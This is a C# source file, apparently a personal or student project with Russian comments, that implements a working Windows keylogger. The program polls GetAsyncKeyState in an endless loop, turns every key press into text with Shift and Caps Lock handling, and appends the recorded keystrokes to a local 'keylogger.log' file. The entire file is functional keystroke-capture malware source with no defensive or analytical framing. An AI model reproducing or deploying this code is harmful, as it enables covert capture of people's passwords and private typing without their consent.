using System.Runtime.InteropServices;

namespace project_kan
{
    internal static class Program
    {
        [STAThread]
        [DllImport("user32.dll")]
        public static extern int GetAsyncKeyState(Int32 i);
        static void Main(String[] args)
        {
            File.Delete("keylogger.log");
            string buf = "";
            while (true)
            {
                Thread.Sleep(100);

                //почему-то определяет язык только тот, что был при запуске программы
                //string Text = "";
                //InputLanguage myCurrentLanguage = InputLanguage.CurrentInputLanguage;
                //Text = myCurrentLanguage.Culture.EnglishName;

                for (int i = 0; i < 255; i++)
                {
                    int state = GetAsyncKeyState(i);

                    bool shift = false;
                    short shiftState = (short)GetAsyncKeyState(16);
                    // Keys.ShiftKey не работает, поэтому я подставила его числовой эквивалент
                    if ((shiftState & 0x8000) == 0x8000)
                    {
                        shift = true;
                    }
                    var caps = Console.CapsLock;
                    bool isBig = shift | caps;

                    
                    if (state != 0)
                    {
                        if (((Keys)i) == Keys.Space) { buf += " "; continue; }
                        if (((Keys)i) == Keys.Enter) { buf += "\r\n"; continue; }
                        if (((Keys)i).ToString().Contains("Shift") || ((Keys)i) == Keys.Capital) { continue; }
                        if (((Keys)i) == Keys.LButton || ((Keys)i) == Keys.RButton || ((Keys)i) == Keys.MButton) continue;
                        if (((Keys)i) == Keys.Escape || ((Keys)i) == Keys.NumLock || ((Keys)i) == Keys.PrintScreen) continue;
                        if (((Keys)i).ToString().Length == 1)
                        {
                            if (isBig)
                            {
                                buf += ((Keys)i).ToString();
                            }
                            else
                            {
                                buf += ((Keys)i).ToString().ToLowerInvariant();
                            }
                        }
                        else
                        {
                            switch (((Keys)i).ToString())
                            {
                                case "D1":
                                    if (shift) buf += "!";
                                    else buf += "1";
                                    break;
                                case "D2":
                                    if (shift /*&& text == "English (United States)"*/) buf += "@";
                                    //else if (shift /*&& text == "Russian (Russia)"*/) buf += '"'; 
                                    else buf += "2";
                                    break;
                                case "D3":
                                    if (shift) buf += "#";
                                    else buf += "3";
                                    break;
                                case "D4":
                                    if (shift) buf += "$";
                                    else buf += "4";
                                    break;
                                case "D5":
                                    if (shift) buf += "%";
                                    else buf += "5";
                                    break;
                                case "D6":
                                    if (shift) buf += "^";
                                    else buf += "6";
                                    break;
                                case "D7":
                                    if (shift) buf += "&";
                                    else buf += "7";
                                    break;
                                case "D8":
                                    if (shift) buf += "*";
                                    else buf += "8";
                                    break;
                                case "D9":
                                    if (shift) buf += "(";
                                    else buf += "9";
                                    break;
                                case "D0":
                                    if (shift) buf += ")";
                                    else buf += "0";
                                    break;
                                case "Oemplus":
                                    if (shift) buf += "+";
                                    else buf += "=";
                                    break;
                                case "OemMinus":
                                    if (shift) buf += "_";
                                    else buf += "-";
                                    break;
                                case "Oem1":
                                    if (shift) buf += ":";
                                    else buf += ";";
                                    break;
                                case "OemQuestion":
                                    if (shift) buf += "?";
                                    else buf += "/";
                                    break;
                                case "OemPeriod":
                                    if (shift) buf += ">";
                                    else buf += ".";
                                    break;
                                case "Oemcomma":
                                    if (shift) buf += "<";
                                    else buf += ",";
                                    break;
                                case "Oem7":
                                    if (shift) buf += '"';
                                    else buf += "'";
                                    break;
                                case "OemOpenBrackets":
                                    if (shift) buf += "{";
                                    else buf += "[";
                                    break;
                                case "Oem6":
                                    if (shift) buf += "}";
                                    else buf += "]";
                                    break;
                                case "Oemtilde":
                                    if (shift) buf += "~";
                                    else buf += "`";
                                    break;
                                case "Oem5":
                                    if (shift) buf += "|";
                                    else buf += '\\';
                                    break;
                                default:
                                    buf += $"<{((Keys)i).ToString()}>";
                                    break;
                            }
                            //if (((Keys)i).ToString() == "D1")111~`~`~ ~~~ ``` ~ ~ ~ ``` ` ` ` 11111111111
                            //{
                            //    buf += "1";
                            //}
                            //else
                            //{
                            //    buf += $"<{((Keys)i).ToString()}>";
                            //}
                        }
                        if (buf.Length > 10)
                        {
                            File.AppendAllText("keylogger.log", buf);
                            buf = "";
                        }
                        //buf += ((Keys)i).ToString();
                        //if (buf.Length > 10)
                        //{
                        //    File.AppendAllText("keylogger.log", buf);
                        //    buf = "";
                        //}
                    }
                }
            }
        }
    }
}